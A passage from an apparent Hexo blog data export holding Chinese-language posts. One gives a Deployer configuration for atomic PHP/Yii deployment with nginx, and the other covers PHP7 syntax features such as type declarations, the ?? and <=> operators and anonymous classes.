class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">// 包含必要的库</span><br><span class=\"line\">require &apos;recipe/symfony.php&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 预定的安装目录</span><br><span class=\"line\">$path = &apos;/srv/www/myproject&apos;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 要部署到的机器</span><br><span class=\"line\">server(&apos;prod&apos;, &apos;localhost&apos;, 22)</span><br><span class=\"line\">-&gt;user(&apos;name&apos;) // 登录主机的用户</span><br><span class=\"line\">-&gt;password(null) // 如果是null，会在安装前询问你密码</span><br><span class=\"line\">-&gt;stage(&apos;production&apos;)</span><br><span class=\"line\">// 需要先在这台机器上创建这个目录</span><br><span class=\"line\">-&gt;env(&apos;deploy_path&apos;, $path);</span><br><span class=\"line\"></span><br><span class=\"line\">// 指定git仓库的位置，如果是私有的，可以根据HTTP协议设置登录用户</span><br><span class=\"line\">set(&apos;repository&apos;, &apos;https://[username]:[password]@github.com/my/project.git&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">// 要执行的部署任务，deploy自带了一些逻辑比如更新代码和依赖库</span><br><span class=\"line\">task(&apos;deploy&apos;, [</span><br><span class=\"line\">    &apos;deploy:prepare&apos;, // 登录服务器</span><br><span class=\"line\">    &apos;deploy:release&apos;, // 创建发布目录</span><br><span class=\"line\">    &apos;deploy:update_code&apos;, // 下载源代码</span><br><span class=\"line\">    &apos;deploy:vendors&apos;, // 更新composer</span><br><span class=\"line\">]);</span><br><span class=\"line\"></span><br><span class=\"line\">// 我们也可以自定义部署的逻辑，比如调用Yii的init脚本初始化目录权限</span><br><span class=\"line\">task(&apos;init&apos;, function() &#123;</span><br><span class=\"line\">    // &#123;&#123;release_path&#125;&#125; 是deployer定义的变量，指程序部署到的目录位置</span><br><span class=\"line\">    run(&quot;&#123;&#123;release_path&#125;&#125;/init --env=&apos;Production&apos; --overwrite=All&quot;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">// 更新线上目录current的源目录指向</span><br><span class=\"line\">task(&apos;push&apos;, function() &#123;</span><br><span class=\"line\">    // &#123;&#123;deploy_path&#125;&#125; 是指整个项目的位置，等于 $path</span><br><span class=\"line\">    run(&quot;ln -sfn &#123;&#123;release_path&#125;&#125; &#123;&#123;deploy_path&#125;&#125;/current&quot;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">// 更新opcache对文件的缓存，因为nginx传入的document_root是虚拟链接，所以不会改变，需要手动清空缓存</span><br><span class=\"line\">task(&apos;cache&apos;, function() &#123;</span><br><span class=\"line\">    run(&apos;/usr/bin/env php -r &quot;opcache_reset();&quot;&apos;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">// 在自带的部署任务完成后，执行自定义的逻辑</span><br><span class=\"line\">// 更新yii2目录权限为线上配置</span><br><span class=\"line\">after(&apos;deploy&apos;, &apos;init&apos;);</span><br><span class=\"line\">// 更新指向线上目录的位置，这里才正式发布了</span><br><span class=\"line\">after(&apos;deploy&apos;, &apos;push&apos;);</span><br><span class=\"line\">// 更新opcache缓存，否则程序更改不会生效</span><br><span class=\"line\">after(&apos;deploy&apos;, &apos;cache&apos;);</span><br></pre></td></tr></table></figure>\n<h4 id=\"目录说明\"><a href=\"#目录说明\" class=\"headerlink\" title=\"目录说明\"></a>目录说明</h4><p><strong>/srv/www/myproject</strong></p>\n<p>设定的项目部署位置</p>\n<p><strong></strong></p>\n<p>它是为了方便而自动创建的一个软链接目录，总是指向正在部署中的那个目录（<strong>releases</strong> 下）</p>\n<p><strong>/current</strong></p>\n<p>线上目录，它也是一个软链接．不过在部署完成后，它才会更新．因此它是原子性的，不会影响线上访问．</p>\n<h3 id=\"开始部署\"><a href=\"#开始部署\" class=\"headerlink\" title=\"开始部署\"></a>开始部署</h3><p>参数 <strong>deploy</strong> 就是刚才创建的部署程序文件名，<strong>production</strong>就是按线上生产环境部署<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ~/.composer/vendor/bin/dep deploy production</span><br><span class=\"line\">✔ Executing task deploy:prepare</span><br><span class=\"line\">✔ Executing task deploy:release</span><br><span class=\"line\">✔ Executing task deploy:update_code</span><br><span class=\"line\">✔ Executing task deploy:clear_controllers</span><br><span class=\"line\">✔ Executing task deploy:vendors</span><br><span class=\"line\">✔ Executing task init</span><br><span class=\"line\">✔ Executing task push</span><br><span class=\"line\">✔ Executing task cache</span><br></pre></td></tr></table></figure></p>\n<p>部署后可以看到这样的目录结构<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ tree -L 2 /srv/www/myproject</span><br><span class=\"line\">.</span><br><span class=\"line\">|-- current -&gt; /srv/www/myproject/releases/20150617163027</span><br><span class=\"line\">|-- release -&gt; /srv/www/myproject/releases/20150617163027</span><br><span class=\"line\">|-- releases</span><br><span class=\"line\">|   |-- 20150617160840</span><br><span class=\"line\">|   |-- 20150617161024</span><br><span class=\"line\">|   |-- 20150617161702</span><br><span class=\"line\">|   |-- 20150617162823</span><br><span class=\"line\">|   `-- 20150617163027</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"nginx的配置\"><a href=\"#nginx的配置\" class=\"headerlink\" title=\"nginx的配置\"></a>nginx的配置</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">      root /srv/www/myproject/current;</span><br><span class=\"line\">      ......</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>&nbsp;</p>\n<p>至此可以实现不影响线上访问，原子性的部署．更多文档参见  <a href=\"http://deployer.org/docs\" target=\"_blank\" rel=\"noopener\">http://deployer.org/docs</a></p>\n"},{"title":"PHP7语法新特性","id":"89","date":"2015-06-15T15:15:24.000Z","_content":"\n# 这篇文章已经过时了\n\n这是半年前对alpha版本写的，现在PHP7正式版已经发布了，功能上又有所调整。下面是中文的官方文档，推荐阅读：\n\n> [http://php.net/manual/zh/migration70.new-features.php](http://php.net/manual/zh/migration70.new-features.php)\n\nPS：官方文档还有一小部分没有翻译完，可以阅读完整的中文翻译版本：\n\n> [https://github.com/pangee/Migrating-from-PHP5.6.x-to-PHP7.0.x/blob/master/New-features.md](https://github.com/pangee/Migrating-from-PHP5.6.x-to-PHP7.0.x/blob/master/New-features.md)\n\n&nbsp;\n\n&nbsp;\n\n&nbsp;\n===================== 时间分割线 ========================\n&nbsp;\n\n前几周PHP 7.0.0 Alpha 1发布了\n\n> ## [PHP 7.0.0 Alpha 1 Released](http://php.net/archive/2015.php#id2015-01-11-6)\n\nPHP7在性能上有很大提升，然而不止这些．[ChangeLog](http://php.net/archive/2015.php#id2015-01-11-6)上还有一些重要的变化，可以说PHP变得更加面向对象了\n\n### Many fatal errors are now Exceptions\n\n### 许多致命错误改为抛出异常\n\n这绝对的是最重要的改变，如果PHP5的程序出现fatal errors，补救是很麻烦的，很多服务直接终止并响应500错误码．而过去只能依靠 `register_shutdown_function()` 来做一些事后的处理．\n\n现在如果用异常来表示，就可以很方便的捕获并按预定方案处理．\n\n> wiki: [https://wiki.php.net/rfc/engine_exceptions_for_php7](https://wiki.php.net/rfc/engine_exceptions_for_php7)\n\n### Return Type Declarations\n\n### 返回值类型声明\n\n可以通过函数名后加入 **[: _type_]** 来声明返回值的类型了，这一点改变是有必要的．大多数方法都只提供单一类型的返回值，通过这里的声明可以及时避免错误，让代码更严谨．\n\n#### 示例：限定返回array类型\n\n```\nfunction foo(): array {\n    return [];\n}\n```\n\n> wiki [https://wiki.php.net/rfc/return_types](https://wiki.php.net/rfc/return_types)\n\n### Scalar Type Declarations\n\n### 标量类型声明\n\n参数或返回值只要是标量`string, int, float, boolean`，也可以像上面一样限定为单一类型．而当前PHP5只可以限定`array`和`object`类型的参数了．\n\n#### 示例用法：限制参数为int类型\n\n```\nfunction add(int $a, int $b): string {\n    return $a . $b;\n}\n```\n\n标量声明的主要作用是自动实现参数的强制类型转换．不然很多时候我们要在代码里写很多 (int) (bool)\n\n#### 自动转换示例\n\n```\nvar_dump(add(1, \"2a\")); // string(\"12\")\n```\n\n> wiki [https://wiki.php.net/rfc/scalar_type_hints_v5](https://wiki.php.net/rfc/scalar_type_hints_v5)\n\n### Null Coalesce Operator\n\n### 空值运算符\n\n这是专门判断空值的操作符，示例代码：\n获取GET参数user，如果参数不存在，则默认值是nobody\n\n```\n$username = $_GET['user'] ?? 'nobody';\n```\n\n上面的代码等同于PHP5的:\n\n```\n$username = isset($_GET['user']) ? $_GET['user'] : 'nobody';\n```\n\n以后判断请求参数取默认值就方便多了\n\n> wiki: [https://wiki.php.net/rfc/isset_ternary](https://wiki.php.net/rfc/isset_ternary)\n\n### Combined comparison Operator (<=>)\n\n### 合并比较运算符\n\n以前我们比较大小经常用这种写法\n\n```\n$a = 1;\n$b = 2;\n\nif ($a > $b) {\n    echo 1;\n} elseif ($a == $b) {\n    echo 0;\n} else {\n    echo -1;\n}\n```\n\n新的 **<=>** 运算符也是起到这个作用\n\n```\necho 1 <=> 1; // 0\necho 1 <=> 2; // -1\necho 2 <=> 1; // 1\n```\n\n现在它可以简化上面一串if else的写法了\n\n```\nswitch ($a  <=> $b)\n{\n    case 1:\n    break;\n    case 0:\n    break;\n    case -1:\n    break;\n}\n```\n\n这样是不是更清爽．上面的只是示例，也可以按需求用其它逻辑实现\n\n> wiki [https://wiki.php.net/rfc/combined-comparison-operator](https://wiki.php.net/rfc/combined-comparison-operator)\n\n### Anonymous Classes\n\n### 匿名类\n\n不需要给类命名，这和匿名函数类似\n\n示例代码\n\n```\n<?php\n/* implementing an anonymous console object from your framework maybe */\n(new class extends ConsoleProgram {\n    public function main() {\n       /* ... */\n    }\n})->main();\n```\n\n> wiki: [https://wiki.php.net/rfc/anonymous_classes](https://wiki.php.net/rfc/anonymous_classes)\n\n&nbsp;","source":"_posts/php7-e6-96-b0-e7-89-b9-e6-80-a7.md","raw":"---\ntitle: PHP7语法新特性\nid: 89\ncategories:\n  - php\ndate: 2015-06-15 23:15:24\ntags:\n---\n\n# 这篇文章已经过时了\n\n这是半年前对alpha版本写的，现在PHP7正式版已经发布了，功能上又有所调整。下面是中文的官方文档，推荐阅读：\n\n> [http://php.net/manual/zh/migration70.new-features.php](http://php.net/manual/zh/migration70.new-features.php)\n\nPS：官方文档还有一小部分没有翻译完，可以阅读完整的中文翻译版本：\n\n> [https://github.com/pangee/Migrating-from-PHP5.6.x-to-PHP7.0.x/blob/master/New-features.md](https://github.com/pangee/Migrating-from-PHP5.6.x-to-PHP7.0.x/blob/master/New-features.md)\n\n&nbsp;\n\n&nbsp;\n\n&nbsp;\n===================== 时间分割线 ========================\n&nbsp;\n\n前几周PHP 7.0.0 Alpha 1发布了\n\n> ## [PHP 7.0.0 Alpha 1 Released](http://php.net/archive/2015.php#id2015-01-11-6)\n\nPHP7在性能上有很大提升，然而不止这些．[ChangeLog](http://php.net/archive/2015.php#id2015-01-11-6)上还有一些重要的变化，可以说PHP变得更加面向对象了\n\n### Many fatal errors are now Exceptions\n\n### 许多致命错误改为抛出异常\n\n这绝对的是最重要的改变，如果PHP5的程序出现fatal errors，补救是很麻烦的，很多服务直接终止并响应500错误码．而过去只能依靠 `register_shutdown_function()` 来做一些事后的处理．\n\n现在如果用异常来表示，就可以很方便的捕获并按预定方案处理．\n\n> wiki: [https://wiki.php.net/rfc/engine_exceptions_for_php7](https://wiki.php.net/rfc/engine_exceptions_for_php7)\n\n### Return Type Declarations\n\n### 返回值类型声明\n\n可以通过函数名后加入 **[: _type_]** 来声明返回值的类型了，这一点改变是有必要的．大多数方法都只提供单一类型的返回值，通过这里的声明可以及时避免错误，让代码更严谨．\n\n#### 示例：限定返回array类型\n\n```\nfunction foo(): array {\n    return [];\n}\n```\n\n> wiki [https://wiki.php.net/rfc/return_types](https://wiki.php.net/rfc/return_types)\n\n### Scalar Type Declarations\n\n### 标量类型声明\n\n参数或返回值只要是标量`string, int, float, boolean`，也可以像上面一样限定为单一类型．而当前PHP5只可以限定`array`和`object`类型的参数了．\n\n#### 示例用法：限制参数为int类型\n\n```\nfunction add(int $a, int $b): string {\n    return $a . $b;\n}\n```\n\n标量声明的主要作用是自动实现参数的强制类型转换．不然很多时候我们要在代码里写很多 (int) (bool)\n\n#### 自动转换示例\n\n```\nvar_dump(add(1, \"2a\")); // string(\"12\")\n```\n\n> wiki [https://wiki.php.net/rfc/scalar_type_hints_v5](https://wiki.php.net/rfc/scalar_type_hints_v5)\n\n### Null Coalesce Operator\n\n### 空值运算符\n\n这是专门判断空值的操作符，示例代码：\n获取GET参数user，如果参数不存在，则默认值是nobody\n\n```\n$username = $_GET['user'] ?? 'nobody';\n```\n\n上面的代码等同于PHP5的:\n\n```\n$username = isset($_GET['user']) ? $_GET['user'] : 'nobody';\n```\n\n以后判断请求参数取默认值就方便多了\n\n> wiki: [https://wiki.php.net/rfc/isset_ternary](https://wiki.php.net/rfc/isset_ternary)\n\n### Combined comparison Operator (<=>)\n\n### 合并比较运算符\n\n以前我们比较大小经常用这种写法\n\n```\n$a = 1;\n$b = 2;\n\nif ($a > $b) {\n    echo 1;\n} elseif ($a == $b) {\n    echo 0;\n} else {\n    echo -1;\n}\n```\n\n新的 **<=>** 运算符也是起到这个作用\n\n```\necho 1 <=> 1; // 0\necho 1 <=> 2; // -1\necho 2 <=> 1; // 1\n```\n\n现在它可以简化上面一串if else的写法了\n\n```\nswitch ($a  <=> $b)\n{\n    case 1:\n    break;\n    case 0:\n    break;\n    case -1:\n    break;\n}\n```\n\n这样是不是更清爽．上面的只是示例，也可以按需求用其它逻辑实现\n\n> wiki [https://wiki.php.net/rfc/combined-comparison-operator](https://wiki.php.net/rfc/combined-comparison-operator)\n\n### Anonymous Classes\n\n### 匿名类\n\n不需要给类命名，这和匿名函数类似\n\n示例代码\n\n```\n<?php\n/* implementing an anonymous console object from your framework maybe */\n(new class extends ConsoleProgram {\n    public function main() {\n       /* ... */\n    }\n})->main();\n```\n\n> wiki: [https://wiki.php.net/rfc/anonymous_classes](https://wiki.php.net/rfc/anonymous_classes)\n\n&nbsp;","slug":"php7-e6-96-b0-e7-89-b9-e6-80-a7","published":1,"updated":"2018-03-05T12:57:51.550Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhwm002nlzlmn5qaq1wj","content":"<h1 id=\"这篇文章已经过时了\"><a href=\"#这篇文章已经过时了\" class=\"headerlink\" title=\"这篇文章已经过时了\"></a>这篇文章已经过时了</h1><p>这是半年前对alpha版本写的，现在PHP7正式版已经发布了，功能上又有所调整。下面是中文的官方文档，推荐阅读：</p>\n<blockquote>\n<p><a href=\"http://php.net/manual/zh/migration70.new-features.php\" target=\"_blank\" rel=\"noopener\">http://php.net/manual/zh/migration70.new-features.php</a></p>\n</blockquote>\n<p>PS：官方文档还有一小部分没有翻译完，可以阅读完整的中文翻译版本：</p>\n<blockquote>\n<p><a href=\"https://github.com/pangee/Migrating-from-PHP5.6.x-to-PHP7.0.x/blob/master/New-features.md\" target=\"_blank\" rel=\"noopener\">https://github.com/pangee/Migrating-from-PHP5.6.x-to-PHP7.0.x/blob/master/New-features.md</a></p>\n</blockquote>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;<br>===================== 时间分割线 ========================<br>&nbsp;</p>\n<p>前几周PHP 7.0.0 Alpha 1发布了</p>\n<blockquote>\n<h2 id=\"PHP-7-0-0-Alpha-1-Released\"><a href=\"#PHP-7-0-0-Alpha-1-Released\" class=\"headerlink\" title=\"PHP 7.0.0 Alpha 1 Released\"></a><a href=\"http://php.net/archive/2015.php#id2015-01-11-6\" target=\"_blank\" rel=\"noopener\">PHP 7.0.0 Alpha 1 Released</a></h2></blockquote>\n<p>PHP7在性能上有很大提升，然而不止这些．<a href=\"http://php.net/archive/2015.php#id2015-01-11-6\" target=\"_blank\" rel=\"noopener\">ChangeLog</a>上还有一些重要的变化，可以说PHP变得更加面向对象了</p>\n<h3 id=\"Many-fatal-errors-are-now-Exceptions\"><a href=\"#Many-fatal-errors-are-now-Exceptions\" class=\"headerlink\" title=\"Many fatal errors are now Exceptions\"></a>Many fatal errors are now Exceptions</h3><h3 id=\"许多致命错误改为抛出异常\"><a href=\"#许多致命错误改为抛出异常\" class=\"headerlink\" title=\"许多致命错误改为抛出异常\"></a>许多致命错误改为抛出异常</h3><p>这绝对的是最重要的改变，如果PHP5的程序出现fatal errors，补救是很麻烦的，很多服务直接终止并响应500错误码．而过去只能依靠 <code>register_shutdown_function()</code> 来做一些事后的处理．</p>\n<p>现在如果用异常来表示，就可以很方便的捕获并按预定方案处理．</p>\n<blockquote>\n<p>wiki: <a href=\"https://wiki.php.net/rfc/engine_exceptions_for_php7\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/rfc/engine_exceptions_for_php7</a></p>\n</blockquote>\n<h3 id=\"Return-Type-Declarations\"><a href=\"#Return-Type-Declarations\" class=\"headerlink\" title=\"Return Type Declarations\"></a>Return Type Declarations</h3><h3 id=\"返回值类型声明\"><a href=\"#返回值类型声明\" class=\"headerlink\" title=\"返回值类型声明\"></a>返回值类型声明</h3><p>可以通过函数名后加入 <strong>[: <em>type</em>]</strong> 来声明返回值的类型了，这一点改变是有必要的．大多数方法都只提供单一类型的返回值，通过这里的声明可以及时避免错误，让代码更严谨．</p>\n<h4 id=\"示例：限定返回array类型\"><a href=\"#示例：限定返回array类型\" class=\"headerlink\" title=\"示例：限定返回array类型\"></a>示例：限定返回array类型</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function foo(): array &#123;</span><br><span class=\"line\">    return [];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>wiki <a href=\"https://wiki.php.net/rfc/return_types\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/rfc/return_types</a></p>\n</blockquote>\n<h3 id=\"Scalar-Type-Declarations\"><a href=\"#Scalar-Type-Declarations\" class=\"headerlink\" title=\"Scalar Type Declarations\"></a>Scalar Type Declarations</h3><h3 id=\"标量类型声明\"><a href=\"#标量类型声明\" class=\"headerlink\" title=\"标量类型声明\"></a>标量类型声明</h3><p>参数或返回值只要是标量<code>string, int, float, boolean</code>，也可以像上面一样限定为单一类型．而当前PHP5只可以限定<code>array</code>和<code>object</code>类型的参数了．</p>\n<h4 id=\"示例用法：限制参数为int类型\"><a href=\"#示例用法：限制参数为int类型\" class=\"headerlink\" title=\"示例用法：限制参数为int类型\"></a>示例用法：限制参数为int类型</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function add(int $a, int $b): string &#123;</span><br><span class=\"line\">    return $a . $b;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>标量声明的主要作用是自动实现参数的强制类型转换．不然很多时候我们要在代码里写很多 (int) (bool)</p>\n<h4 id=\"自动转换示例\"><a href=\"#自动转换示例\" class=\"headerlink\" title=\"自动转换示例\"></a>自动转换示例</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var_dump(add(1, &quot;2a&quot;)); // string(&quot;12&quot;)</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>wiki <a href=\"https://wiki.php.net/rfc/scalar_type_hints_v5\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/rfc/scalar_type_hints_v5</a></p>\n</blockquote>\n<h3 id=\"Null-Coalesce-Operator\"><a href=\"#Null-Coalesce-Operator\" class=\"headerlink\" title=\"Null Coalesce Operator\"></a>Null Coalesce Operator</h3><h3 id=\"空值运算符\"><a href=\"#空值运算符\" class=\"headerlink\" title=\"空值运算符\"></a>空值运算符</h3><p>这是专门判断空值的操作符，示例代码：<br>获取GET参数user，如果参数不存在，则默认值是nobody</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$username = $_GET[&apos;user&apos;] ?? &apos;nobody&apos;;</span><br></pre></td></tr></table></figure>\n<p>上面的代码等同于PHP5的:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$username = isset($_GET[&apos;user&apos;]) ? $_GET[&apos;user&apos;] : &apos;nobody&apos;;</span><br></pre></td></tr></table></figure>\n<p>以后判断请求参数取默认值就方便多了</p>\n<blockquote>\n<p>wiki: <a href=\"https://wiki.php.net/rfc/isset_ternary\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/rfc/isset_ternary</a></p>\n</blockquote>\n<h3 id=\"Combined-comparison-Operator-lt-gt\"><a href=\"#Combined-comparison-Operator-lt-gt\" class=\"headerlink\" title=\"Combined comparison Operator (&lt;=&gt;)\"></a>Combined comparison Operator (&lt;=&gt;)</h3><h3 id=\"合并比较运算符\"><a href=\"#合并比较运算符\" class=\"headerlink\" title=\"合并比较运算符\"></a>合并比较运算符</h3><p>以前我们比较大小经常用这种写法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a = 1;</span><br><span class=\"line\">$b = 2;</span><br><span class=\"line\"></span><br><span class=\"line\">if ($a &gt; $b) &#123;</span><br><span class=\"line\">    echo 1;</span><br><span class=\"line\">&#125; elseif ($a == $b) &#123;</span><br><span class=\"line\">    echo 0;</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    echo -1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>新的 <strong>&lt;=&gt;</strong> 运算符也是起到这个作用</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo 1 &lt;=&gt; 1; // 0</span><br><span class=\"line\">echo 1 &lt;=&gt; 2; // -1</span><br><span class=\"line\">echo 2 &lt;=&gt; 1; // 1</span><br></pre></td></tr></table></figure>\n<p>现在它可以简化上面一串if else的写法了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">switch ($a  &lt;=&gt; $b)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    case 1:</span><br><span class=\"line\">    break;</span><br><span class=\"line\">    case 0:</span><br><span class=\"line\">    break;</span><br><span class=\"line\">    case -1:</span><br><span class=\"line\">    break;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这样是不是更清爽．上面的只是示例，也可以按需求用其它逻辑实现</p>\n<blockquote>\n<p>wiki <a href=\"https://wiki.php.net/rfc/combined-comparison-operator\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/rfc/combined-comparison-operator</a></p>\n</blockquote>\n<h3 id=\"Anonymous-Classes\"><a href=\"#Anonymous-Classes\" class=\"headerlink\" title=\"Anonymous Classes\"></a>Anonymous Classes</h3><h3 id=\"匿名类\"><a href=\"#匿名类\" class=\"headerlink\" title=\"匿名类\"></a>匿名类</h3><p>不需要给类命名，这和匿名函数类似</p>\n<p>示例代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">/* implementing an anonymous console object from your framework maybe */</span><br><span class=\"line\">(new class extends ConsoleProgram &#123;</span><br><span class=\"line\">    public function main() &#123;</span><br><span class=\"line\">       /* ... */</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)-&gt;main();</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>wiki: <a href=\"https://wiki.php.net/rfc/anonymous_classes\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/rfc/anonymous_classes</a></p>\n</blockquote>\n<p>&nbsp;</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"这篇文章已经过时了\"><a href=\"#这篇文章已经过时了\" class=\"headerlink\" title=\"这篇文章已经过时了\"></a>这篇文章已经过时了</h1><p>这是半年前对alpha版本写的，现在PHP7正式版已经发布了，功能上又有所调整。下面是中文的官方文档，推荐阅读：</p>\n<blockquote>\n<p><a href=\"http://php.net/manual/zh/migration70.new-features.php\" target=\"_blank\" rel=\"noopener\">http://php.net/manual/zh/migration70.new-features.php</a></p>\n</blockquote>\n<p>PS：官方文档还有一小部分没有翻译完，可以阅读完整的中文翻译版本：</p>\n<blockquote>\n<p><a href=\"https://github.com/pangee/Migrating-from-PHP5.6.x-to-PHP7.0.x/blob/master/New-features.md\" target=\"_blank\" rel=\"noopener\">https://github.com/pangee/Migrating-from-PHP5.6.x-to-PHP7.0.x/blob/master/New-features.md</a></p>\n</blockquote>\n<p>&nbsp;</p>\n<p>&nbsp;</p>\n<p>&nbsp;<br>===================== 时间分割线 ========================<br>&nbsp;</p>\n<p>前几周PHP 7.0.0 Alpha 1发布了</p>\n<blockquote>\n<h2 id=\"PHP-7-0-0-Alpha-1-Released\"><a href=\"#PHP-7-0-0-Alpha-1-Released\" class=\"headerlink\" title=\"PHP 7.0.0 Alpha 1 Released\"></a><a href=\"http://php.net/archive/2015.php#id2015-01-11-6\" target=\"_blank\" rel=\"noopener\">PHP 7.0.0 Alpha 1 Released</a></h2></blockquote>\n<p>PHP7在性能上有很大提升，然而不止这些．<a href=\"http://php.net/archive/2015.php#id2015-01-11-6\" target=\"_blank\" rel=\"noopener\">ChangeLog</a>上还有一些重要的变化，可以说PHP变得更加面向对象了</p>\n<h3 id=\"Many-fatal-errors-are-now-Exceptions\"><a href=\"#Many-fatal-errors-are-now-Exceptions\" class=\"headerlink\" title=\"Many fatal errors are now Exceptions\"></a>Many fatal errors are now Exceptions</h3><h3 id=\"许多致命错误改为抛出异常\"><a href=\"#许多致命错误改为抛出异常\" class=\"headerlink\" title=\"许多致命错误改为抛出异常\"></a>许多致命错误改为抛出异常</h3><p>这绝对的是最重要的改变，如果PHP5的程序出现fatal errors，补救是很麻烦的，很多服务直接终止并响应500错误码．而过去只能依靠 <code>register_shutdown_function()</code> 来做一些事后的处理．</p>\n<p>现在如果用异常来表示，就可以很方便的捕获并按预定方案处理．</p>\n<blockquote>\n<p>wiki: <a href=\"https://wiki.php.net/rfc/engine_exceptions_for_php7\" target=\"_blank\" rel=\"noopener\">https://wiki.php.net/rfc/engine_exceptions_for_php7</a></p>\n</blockquote>\n<h3 id=\"Return-Type-Declarations\"><a href=\"#Return-Type-Declarations\" class=\"headerlink\" title=\"Return Type Declarations\"></a>Return Type Declarations</h3><h3 id=\"返回值类型声明\"><a href=\"#返回值类型声明\" class=\"headerlink\" title=\"返回值类型声明\"></a>返回值类型声明</h3><p>可以通过函数名后加入 <strong>[: <em>type</em>]</strong> 来声明返回值的类型了，这一点改变是有必要的．大多数方法都只提供单一类型的返回值，通过这里的声明可以及时避免错误，让代码更严谨．</p>\n<h4 